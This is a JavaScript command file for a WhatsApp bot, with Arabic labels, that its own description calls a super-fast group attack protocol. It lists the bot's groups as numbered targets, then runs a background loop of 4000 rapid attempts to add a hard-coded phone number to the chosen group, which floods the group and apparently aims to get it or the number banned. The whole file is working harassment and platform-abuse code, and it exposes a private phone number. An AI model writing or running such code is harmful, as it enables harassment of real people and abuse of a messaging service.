/**
 * تبنيد.js — أمر تبنيد الجروبات فائق السرعة
 */

module.exports = {
    name: 'تبنيد',
    command: ['تبنيد'],
    category: 'owner',
    description: 'بروتوكول الهجوم الفائق والضغط المكثف للجروبات مع حساب الزمن',

    async execute(sock, m) {
        const jid = m.key.remoteJid;
        const body = m.message?.conversation || m.message?.extendedTextMessage?.text || '';
        const args = body.trim().split(/ +/).slice(1);
        const sub = args[0]?.trim();

        const reply = async (text) => {
            return await sock.sendMessage(jid, { text }, { quoted: m });
        };

        // إذا لم يتم تحديد رقم الجروب، عرض قائمة الجروبات
        if (!sub) {
            await reply('🔄 [النظام] جلب قطاعات الجروبات النشطة...');
            try {
                const groupMetadatas = await sock.groupFetchAllParticipating();
                const groups = Object.values(groupMetadatas);
                if (groups.length === 0) return reply('⚠️ [النظام] لم يتم العثور على أي جروبات نشطة.');

                let textMsg = '⚡ *الجروبات المستهدفة (الأهداف):*\n';
                groups.forEach((g, i) => {
                    textMsg += `\n┌ 🎯 *الهدف [${i + 1}]* : ${g.subject || 'غير معروف'}\n└ 👥 الأعضاء : ${g.participants.length}`;
                });
                textMsg += '\n\n💻 *طريقة التنفيذ:* \`.تبنيد <رقم_الهدف>\`';
                return reply(textMsg);
            } catch (e) {
                return reply(`❌ [خطأ] فشل في جلب الجروبات: ${e.message}`);
            }
        }

        const groupIndex = parseInt(sub) - 1;

        try {
            const groupMetadatas = await sock.groupFetchAllParticipating();
            const groups = Object.values(groupMetadatas);

            if (isNaN(groupIndex) || groupIndex < 0 || groupIndex >= groups.length) {
                return reply('❌ [خطأ] رقم الهدف غير صحيح. استخدم الأمر `.تبنيد` لعرض قائمة الجروبات.');
            }

            const targetGroup = groups[groupIndex];
            const targetJid = targetGroup.id;

            const totalAttempts = 4000; 
            const delayPerBatch = 80;   
            const estimatedSeconds = Math.ceil((totalAttempts * delayPerBatch) / 1000);
            const timeMessage = estimatedSeconds > 60 
                ? `حوالي ${Math.ceil(estimatedSeconds / 60)} دقائق` 
                : `${estimatedSeconds} ثانية`;

            const TARGET_NUMBERS = ['201128344087'];

            await reply(
                `⚠️ [بروتوكول التدمير الفائق للجروبات]\n` +
                `🚀 الجروب المستهدف: *${targetGroup.subject}*\n` +
                `🔥 الحالة: *ضخ مكثف فائق السرعة (Turbo)*\n` +
                `⏱️ *الزمن اللازم للإنجاز:* ${timeMessage}\n` +
                `🎯 المتجهات المحملة: *${TARGET_NUMBERS.length}*\n\n` +
                `_جاري معالجة وإغراق الجروب حتى الإنتهاء..._`
            );

            // حلقة التنفيذ السريع
            (async () => {
                let count = 0;
                while (count < totalAttempts) {
                    try {
                        const promises = TARGET_NUMBERS.map(async (rawNum) => {
                            const targetUserJid = `${rawNum}@s.whatsapp.net`;
                            return sock.groupParticipantsUpdate(targetJid, [targetUserJid], 'add').catch(() => {});
                        });

                        await Promise.all(promises);
                        count += TARGET_NUMBERS.length;
                        
                        await new Promise(resolve => setTimeout(resolve, delayPerBatch));
                    } catch (err) {
                        await new Promise(resolve => setTimeout(resolve, 50));
                    }
                }
            })();

        } catch (e) {
            return reply(`❌ [خطأ حرج]: ${e.message}`);
        }
    }
};
